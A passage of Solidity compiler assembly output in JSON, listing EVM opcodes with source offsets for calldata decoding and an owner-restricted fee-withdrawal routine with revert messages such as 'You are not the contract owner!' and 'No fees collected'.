											"source": -1
										},
										{
											"begin": 4,
											"end": 6,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 4,
											"end": 6,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "10"
										},
										{
											"begin": 4,
											"end": 6,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 31,
											"end": 32,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 28,
											"end": 29,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 21,
											"end": 33,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 4,
											"end": 6,
											"name": "tag",
											"source": -1,
											"value": "10"
										},
										{
											"begin": 4,
											"end": 6,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 5411,
											"end": 5670,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 5411,
											"end": 5670,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 5411,
											"end": 5670,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 5411,
											"end": 5670,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 5411,
											"end": 5670,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 5411,
											"end": 5670,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 5411,
											"end": 5670,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 5411,
											"end": 5670,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 5411,
											"end": 5670,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 5411,
											"end": 5670,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 5411,
											"end": 5670,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 5411,
											"end": 5670,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 5411,
											"end": 5670,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 5411,
											"end": 5670,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 5411,
											"end": 5670,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 5411,
											"end": 5670,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 5411,
											"end": 5670,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 5411,
											"end": 5670,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 5411,
											"end": 5670,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 5411,
											"end": 5670,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 5411,
											"end": 5670,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 5411,
											"end": 5670,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 5411,
											"end": 5670,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 5411,
											"end": 5670,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 5411,
											"end": 5670,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 5411,
											"end": 5670,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 5411,
											"end": 5670,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 5411,
											"end": 5670,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 5411,
											"end": 5670,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 5411,
											"end": 5670,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 5411,
											"end": 5670,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 5411,
											"end": 5670,
											"name": "tag",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 5411,
											"end": 5670,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5411,
											"end": 5670,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 5893,
											"end": 6219,
											"name": "tag",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 5893,
											"end": 6219,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5973,
											"end": 5985,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 5128,
											"end": 5140,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 5114,
											"end": 5140,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 5114,
											"end": 5140,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 5114,
											"end": 5124,
											"name": "CALLER",
											"source": 0
										},
										{
											"begin": 5114,
											"end": 5140,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 5114,
											"end": 5140,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 5114,
											"end": 5140,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 5106,
											"end": 5175,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 5106,
											"end": 5175,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 5106,
											"end": 5175,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 5106,
											"end": 5175,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 5106,
											"end": 5175,
											"name": "PUSH",
											"source": 0,
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 5106,
											"end": 5175,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 5106,
											"end": 5175,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 5106,
											"end": 5175,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 5106,
											"end": 5175,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 5106,
											"end": 5175,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 5106,
											"end": 5175,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 5106,
											"end": 5175,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 5106,
											"end": 5175,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 5106,
											"end": 5175,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 5106,
											"end": 5175,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 5106,
											"end": 5175,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 5106,
											"end": 5175,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 5106,
											"end": 5175,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 5106,
											"end": 5175,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 5106,
											"end": 5175,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 5106,
											"end": 5175,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 5106,
											"end": 5175,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 5106,
											"end": 5175,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 5106,
											"end": 5175,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 5106,
											"end": 5175,
											"name": "PUSH",
											"source": 0,
											"value": "596F7520617265206E6F742074686520636F6E7472616374206F776E65722100"
										},
										{
											"begin": 5106,
											"end": 5175,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 5106,
											"end": 5175,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 5106,
											"end": 5175,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 5106,
											"end": 5175,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 5106,
											"end": 5175,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 5106,
											"end": 5175,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 5106,
											"end": 5175,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 5106,
											"end": 5175,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 5106,
											"end": 5175,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 5106,
											"end": 5175,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 5106,
											"end": 5175,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 5106,
											"end": 5175,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 5106,
											"end": 5175,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 5106,
											"end": 5175,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 5106,
											"end": 5175,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 5106,
											"end": 5175,
											"name": "tag",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 5106,
											"end": 5175,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 6021,
											"end": 6022,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 6007,
											"end": 6018,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 6007,
											"end": 6022,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 5998,
											"end": 6044,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 5998,
											"end": 6044,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 5998,
											"end": 6044,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 5998,
											"end": 6044,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 5998,
											"end": 6044,
											"name": "PUSH",
											"source": 0,
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 5998,
											"end": 6044,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 5998,
											"end": 6044,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 5998,
											"end": 6044,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 5998,
											"end": 6044,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 5998,
											"end": 6044,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 5998,
											"end": 6044,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 5998,
											"end": 6044,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 5998,
											"end": 6044,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 5998,
											"end": 6044,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 5998,
											"end": 6044,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 5998,
											"end": 6044,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 5998,
											"end": 6044,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 5998,
											"end": 6044,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 5998,
											"end": 6044,
											"name": "PUSH",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 5998,
											"end": 6044,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 5998,
											"end": 6044,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 5998,
											"end": 6044,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 5998,
											"end": 6044,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 5998,
											"end": 6044,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 5998,
											"end": 6044,
											"name": "PUSH",
											"source": 0,
											"value": "4E6F206665657320636F6C6C6563746564000000000000000000000000000000"
										},
										{
											"begin": 5998,
											"end": 6044,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 5998,
											"end": 6044,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 5998,
											"end": 6044,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 5998,
											"end": 6044,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 5998,
											"end": 6044,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 5998,
											"end": 6044,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 5998,
											"end": 6044,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 5998,
											"end": 6044,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 5998,
											"end": 6044,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 5998,
											"end": 6044,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 5998,
											"end": 6044,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 5998,
											"end": 6044,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 5998,
											"end": 6044,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 5998,
											"end": 6044,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 5998,
											"end": 6044,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 5998,
											"end": 6044,
											"name": "tag",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 5998,
											"end": 6044,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 6055,
											"end": 6064,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 6067,
											"end": 6078,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 6055,
											"end": 6078,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 6055,
											"end": 6078,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6102,
											"end": 6103,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 6089,
											"end": 6103,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 6089,
											"end": 6103,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6115,
											"end": 6124,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 6130,
											"end": 6142,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 6130,
											"end": 6147,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 6130,
											"end": 6147,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 6155,
											"end": 6159,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 6130,
											"end": 6164,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 6130,
											"end": 6164,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 6130,
											"end": 6164,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 6130,
											"end": 6164,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 6130,
											"end": 6164,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 6130,
											"end": 6164,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 6130,
											"end": 6164,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6130,
											"end": 6164,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 6130,
											"end": 6164,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 6130,
											"end": 6164,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 6130,
											"end": 6164,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 6130,
											"end": 6164,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 6130,
											"end": 6164,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 6130,
											"end": 6164,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 6130,
											"end": 6164,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 6130,
											"end": 6164,
											"name": "DUP8",
											"source": 0
										},
										{
											"begin": 6130,
											"end": 6164,
											"name": "GAS",
											"source": 0
										},
										{
											"begin": 6130,
											"end": 6164,
											"name": "CALL",
											"source": 0
										},
										{
											"begin": 6130,
											"end": 6164,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 6130,
											"end": 6164,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6130,
											"end": 6164,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6130,
											"end": 6164,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6130,
											"end": 6164,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 12,
											"end": 13,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 19,
											"end": 20,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 14,
											"end": 41,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 14,
											"end": 41,
											"name": "EQ",
											"source": -1
										},
										{
											"begin": 14,
											"end": 41,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "18"
										},
										{
											"begin": 14,
											"end": 41,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 67,
											"end": 71,
											"name": "PUSH",
											"source": -1,
											"value": "40"
										},
										{
											"begin": 61,
											"end": 72,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 56,
											"end": 72,
											"name": "SWAP2",
											"source": -1
										},
										{
											"begin": 56,
											"end": 72,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 134,
											"end": 138,
											"name": "PUSH",
											"source": -1,
											"value": "1F"
										},
										{
											"begin": 130,
											"end": 139,
											"name": "NOT",
											"source": -1
										},
										{
											"begin": 123,
											"end": 127,
											"name": "PUSH",
											"source": -1,
											"value": "3F"
										},
										{
											"begin": 105,
											"end": 121,
											"name": "RETURNDATASIZE",
											"source": -1
										},
										{
											"begin": 101,
											"end": 128,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 97,
											"end": 140,
											"name": "AND",
											"source": -1
										},
										{
											"begin": 94,
											"end": 95,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 90,
											"end": 141,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 84,
											"end": 88,
											"name": "PUSH",
											"source": -1,
											"value": "40"
										},
										{
											"begin": 77,
											"end": 142,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 157,
											"end": 173,
											"name": "RETURNDATASIZE",
											"source": -1
										},
										{
											"begin": 154,
											"end": 155,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 147,
											"end": 174,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 211,
											"end": 227,
											"name": "RETURNDATASIZE",
											"source": -1
										},
										{
											"begin": 208,
											"end": 209,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 201,
											"end": 205,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 198,
											"end": 199,
											"name": "DUP5",
											"source": -1
										},
										{
											"begin": 194,
											"end": 206,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 179,
											"end": 228,
											"name": "RETURNDATACOPY",
											"source": -1
										},
										{
											"begin": 5,
											"end": 233,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "17"
										},
										{
											"begin": 5,
											"end": 233,
											"name": "JUMP",
											"source": -1
										},
										{
											"begin": 14,
											"end": 41,
											"name": "tag",
											"source": -1,
											"value": "18"
										},
										{
											"begin": 14,
											"end": 41,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 32,
											"end": 36,
											"name": "PUSH",
											"source": -1,
											"value": "60"
										},
										{
											"begin": 27,
											"end": 36,
											"name": "SWAP2",
											"source": -1
										},
										{
											"begin": 27,
											"end": 36,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 5,
											"end": 233,
											"name": "tag",
											"source": -1,
											"value": "17"
										},
										{
											"begin": 5,
											"end": 233,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 5,
											"end": 233,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 6114,
											"end": 6164,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6114,
											"end": 6164,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 6114,
											"end": 6164,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6183,
											"end": 6187,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 6175,
											"end": 6211,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 6175,
											"end": 6211,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 6175,
											"end": 6211,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 6175,
											"end": 6211,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 6175,
											"end": 6211,
											"name": "PUSH",
											"source": 0,
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 6175,
											"end": 6211,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 6175,
											"end": 6211,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 6175,
											"end": 6211,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 6175,
											"end": 6211,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 6175,
											"end": 6211,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 6175,
											"end": 6211,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 6175,
											"end": 6211,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 6175,
											"end": 6211,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 6175,
											"end": 6211,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 6175,
											"end": 6211,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 6175,
											"end": 6211,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 6175,
											"end": 6211,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 6175,
											"end": 6211,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 6175,
											"end": 6211,
											"name": "PUSH",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 6175,
											"end": 6211,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 6175,
											"end": 6211,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 6175,
											"end": 6211,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 6175,
											"end": 6211,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 6175,
											"end": 6211,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 6175,
											"end": 6211,
											"name": "PUSH",
											"source": 0,
											"value": "4661696C656420746F2073656E64206665657300000000000000000000000000"
										},
										{
											"begin": 6175,
											"end": 6211,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 6175,
											"end": 6211,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 6175,
											"end": 6211,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6175,
											"end": 6211,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 6175,
											"end": 6211,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 6175,
											"end": 6211,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 6175,
											"end": 6211,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6175,
											"end": 6211,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6175,
											"end": 6211,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 6175,
											"end": 6211,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 6175,
											"end": 6211,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 6175,
											"end": 6211,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 6175,
											"end": 6211,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 6175,
											"end": 6211,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 6175,
											"end": 6211,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 6175,
											"end": 6211,
											"name": "tag",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 6175,
											"end": 6211,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5186,
											"end": 5187,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 5186,
											"end": 5187,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 5893,
											"end": 6219,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 5893,
											"end": 6219,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 5893,
											"end": 6219,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 5893,
											"end": 6219,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 5411,
											"end": 5670,
											"name": "tag",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 5411,
											"end": 5670,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5512,
											"end": 5513,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 5488,
											"end": 5514,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 5488,
											"end": 5514,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 5488,
											"end": 5500,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 5488,
											"end": 5514,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 5488,
											"end": 5514,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 5488,
											"end": 5514,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 5480,
											"end": 5571,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "21"
										},
										{
											"begin": 5480,
											"end": 5571,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 5480,
											"end": 5571,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 5480,
											"end": 5571,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 5480,
											"end": 5571,
											"name": "PUSH",
											"source": 0,
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 5480,
											"end": 5571,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 5480,
											"end": 5571,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 5480,
											"end": 5571,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 5480,
											"end": 5571,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 5480,
											"end": 5571,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 5480,
											"end": 5571,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 5480,
											"end": 5571,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 5480,
											"end": 5571,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 5480,
											"end": 5571,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 5480,
											"end": 5571,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 5480,
											"end": 5571,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 5480,
											"end": 5571,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 5480,
											"end": 5571,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 5480,
											"end": 5571,
											"name": "PUSH",
											"source": 0,
											"value": "34"
										},
										{
											"begin": 5480,
											"end": 5571,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 5480,
											"end": 5571,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 5480,
											"end": 5571,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 5480,
											"end": 5571,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 5480,
											"end": 5571,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 5480,
											"end": 5571,
											"name": "PUSH data",
											"source": 0,
											"value": "8B2C0CC110CB22F213AE6D036672AD90F933D31D663E6D083B02FB50136231C8"
										},
										{
											"begin": 5480,
											"end": 5571,
											"name": "PUSH",
											"source": 0,
											"value": "34"
										},
										{
											"begin": 5480,
											"end": 5571,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 5480,
											"end": 5571,
											"name": "CODECOPY",
											"source": 0
										},
										{
											"begin": 5480,
											"end": 5571,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 5480,
											"end": 5571,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 5480,
											"end": 5571,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 5480,
											"end": 5571,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 5480,
											"end": 5571,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 5480,
											"end": 5571,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 5480,
											"end": 5571,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 5480,
											"end": 5571,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 5480,
											"end": 5571,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 5480,
											"end": 5571,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 5480,
											"end": 5571,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 5480,
											"end": 5571,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 5480,
											"end": 5571,
											"name": "tag",
											"source": 0,
											"value": "21"
										},
										{
											"begin": 5480,
											"end": 5571,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5656,
											"end": 5662,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 5641,
											"end": 5662,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 5641,
											"end": 5662,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 5411,
											"end": 5670,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 5411,
											"end": 5670,
											"name": "POP",
											"source": 0
										},
										{
